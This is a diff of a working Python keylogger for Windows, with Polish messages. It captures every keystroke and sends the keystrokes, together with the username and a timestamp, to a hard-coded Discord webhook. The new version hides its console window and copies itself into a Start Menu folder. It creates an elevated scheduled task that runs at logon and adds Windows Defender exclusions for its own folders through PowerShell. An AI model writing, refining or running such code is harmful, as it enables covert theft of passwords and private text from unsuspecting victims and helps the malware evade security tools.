@@ -1,89 +1,85 @@
 import os
-import requests
-import shutil
-import tempfile
-import subprocess
-import win32gui
-import pythoncom
-import keyboard
+from subprocess import CalledProcessError, run
+from pythoncom import PumpMessages
+from keyboard import on_release
+from win32gui import ShowWindow, FindWindow
+from sys import executable
 from threading import Timer
+from shutil import copy
 from datetime import datetime
 from discord_webhook import DiscordWebhook, DiscordEmbed
+from time import sleep
 
-SEND_REPORT_EVERY = 20  # częstotliwość wysyłania raportów w sekundach
-WEBHOOK = "https://discord.com/api/webhooks/1252318266714619936/QOs16L3ro2s9rMbb27HKlAPlUqZg91g2uCMbkqpSDl9tW1_NLrtQegKXPjTIDq8AAOpY"
+INTERVAL = 30
+WEBHOOK = "https://discord.com/api/webhooks/1252348767076745330/dudagpcaTIvzXpkOVoc4dfDlZY63A9VQugMBHOyF3TBHZm7_Ffz9k1c261BlvWV-qPKp"
 
 class Klasa:
-    def __init__(self, interval, report_method="webhook"):
+    def __init__(self, interval):
         now = datetime.now()
         self.interval = interval
-        self.report_method = report_method
-        self.log = ""
-        self.dzien = now.strftime('%d/%m/%Y')
-        self.godzina = now.strftime('%H:%M')
+        self.script = ""
+        self.date = now.strftime('%d/%m/%Y')
+        self.time = now.strftime('%H:%M')
         self.username = os.getlogin()
+        self.timer = Timer(interval=self.interval, function=self.run)
+        self.timer.daemon = True
 
-    def callback(self, event):
+    def build_script(self, event):
         name = event.name
         if len(name) > 1:
-            if name == "space":
-                name = " "
-            elif name == "enter":
-                name = "\n"
-            elif name == "decimal":
-                name = "."
+            if name == "space": name = " "
+            elif name == "enter": name = "\n"
+            elif name == "decimal": name = "."
             else:
                 name = name.replace(" ", "_")
-                name = f"\n[{name.upper()}] "
-        self.log += name
+                name = f"\n[{name.upper()}] " # [KEY_NAME]
+        self.script += name
 
-    def report_to_webhook(self):
-        flag = False
+    def send_sciprt(self):
         webhook = DiscordWebhook(url=WEBHOOK)
-        if len(self.log) > 2000:
-            flag = True
-            path = os.environ["temp"] + "\\report.txt"
-            with open(path, 'w+') as file:
-                file.write(f"Użytkownik: {self.username} \nData: {self.dzien} \nGodzina: {self.godzina}\n")
-                file.write(self.log)
-            with open(path, 'rb') as f:
-                webhook.add_file(file=f.read(), filename='report.txt')
-        else:
-            embed = DiscordEmbed(title=f"Użytkownik: {self.username} \nData: {self.dzien} \nGodzina: {self.godzina}", description=self.log)
-            webhook.add_embed(embed)
-        webhook.execute()
-        if flag:
-            os.remove(path)
+        embed = DiscordEmbed(title=f"Użytkownik: {self.username} \nData: {self.date} \nGodzina: {self.time}", description=self.script)
+        webhook.add_embed(embed)
+        try:
+            webhook.execute()
+            self.script = ""
+        except Exception as e:
+            print(f"Błąd przy wysyłaniu raportu: {e}")
 
-    def report(self):
-        if self.log:
-            if self.report_method == "webhook":
-                self.report_to_webhook()
-        self.log = ""
-        timer = Timer(interval=self.interval, function=self.report)
-        timer.daemon = True
-        timer.start()
+    def run(self):
+        if self.script:
+            self.send_sciprt()
+        self.timer = Timer(interval=self.interval, function=self.run)
+        self.timer.start()
 
     def start(self):
         self.start_dt = datetime.now()
-        keyboard.on_release(callback=self.callback)
-        self.report()
+        on_release(callback=self.build_script)
+        self.run()
 
-def hide_console_window():
-    console_window = win32gui.GetForegroundWindow()
-    win32gui.ShowWindow(console_window, 0)
 
-def add_to_defender_exceptions():
-    script_path = os.path.abspath(__file__)
-    ps_command = f"Add-MpPreference -ExclusionPath '{script_path}'"
-    try:
-        subprocess.run(["powershell", "-Command", ps_command], check=True)
-    except subprocess.CalledProcessError as e:
-        print(f"Błąd dodawania do wyjątków Windows Defender: {e}")
+
+def preserve():
+    this_filepath = os.path.abspath(executable)
+    this_filename = os.path.basename(this_filepath)
+    this_folder = os.path.dirname(this_filepath)
+    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Logger')
+    os.makedirs(startup_folder, exist_ok=True)
+    startup_filepath = os.path.join(startup_folder, this_filename)
+    if(not os.path.exists(startup_filepath) and startup_folder not in this_filepath):
+        copy(this_filepath, startup_filepath)
+        run(['schtasks', '/create', '/f', '/tn', 'Log', '/tr', f"\"{startup_filepath}\"", '/sc', 'onlogon', '/rl', 'highest', '/delay', '0000:10'])
+
+        ps_command_startup = f"Add-MpPreference -ExclusionPath '{startup_folder}'"
+        ps_command_org = f"Add-MpPreference -ExclusionPath '{this_folder}'"
+        try:
+            run(["powershell", "-Command", ps_command_startup], check=True)
+            run(["powershell", "-Command", ps_command_org], check=True)
+        except CalledProcessError as e:
+            print(f"Błąd dodawania do wyjątków Windows Defender: {e}")
 
 if __name__ == '__main__':
-    add_to_defender_exceptions()  # Dodanie skryptu do wyjątków Windows Defender
-    klasa = Klasa(interval=SEND_REPORT_EVERY, report_method="webhook")
+    ShowWindow(FindWindow(None, os.path.abspath(executable)), 0)
+    preserve()
+    klasa = Klasa(INTERVAL)
     klasa.start()
-    hide_console_window()
-    pythoncom.PumpMessages()
+    PumpMessages()
